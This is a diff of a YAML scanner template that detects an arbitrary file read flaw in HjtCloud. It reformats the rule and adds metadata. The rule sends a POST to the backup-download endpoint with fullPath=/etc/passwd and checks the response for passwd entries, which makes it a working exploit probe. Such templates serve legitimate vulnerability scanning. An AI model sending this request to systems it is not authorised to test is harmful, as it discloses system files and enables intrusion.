@@ -1,15 +1,19 @@
 id: hjtcloud-arbitrary-fileread
 
 info:
-    name: HjtCloud Arbitrary File Read
-    author: B1anda0(https://github.com/B1anda0)
-    severity: high
+  name: HjtCloud Arbitrary File Read
+  author: B1anda0
+  severity: high
+  description: |-
+    HjtCloud 任意文件读取漏洞
+  tags: hjtcloud,fileread
+  created: 2025/01/01
 
 rules:
-    linux0:
-        request:
-            method: POST
-            path: /fileDownload?action=downloadBackupFile
-            body: fullPath=/etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  linux0:
+    request:
+      method: POST
+      path: /fileDownload?action=downloadBackupFile
+      body: fullPath=/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: linux0()
